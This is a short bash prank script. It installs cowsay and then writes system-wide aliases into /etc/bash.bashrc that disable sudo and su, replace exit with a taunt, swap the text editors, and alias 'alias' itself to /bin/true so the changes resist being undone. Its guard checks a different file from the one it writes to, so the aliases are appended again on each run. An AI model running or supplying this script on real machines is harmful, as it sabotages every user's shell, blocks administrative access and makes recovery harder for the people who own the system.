#!/bin/bash
/usr/bin/apt-get install -y cowsay

if /bin/grep --quiet 'alias sudo="cowsay"' /etc/bashrc; then 
  /bin/echo "nvm" > /dev/null
else
  /bin/echo 'alias sudo="cowsay"' >> /etc/bash.bashrc
  /bin/echo 'alias su="/dev/null"' >> /etc/bash.bashrc
  /bin/echo 'alias nano="vi"' >> /etc/bash.bashrc
  /bin/echo 'alias gedit="vi"' >> /etc/bash.bashrc
  /bin/echo 'alias exit="echo You can not escape that easy you yellowbellied scallywag"' >> /etc/bash.bashrc
  /bin/echo 'alias alias=/bin/true' >> /etc/bash.bashrc
fi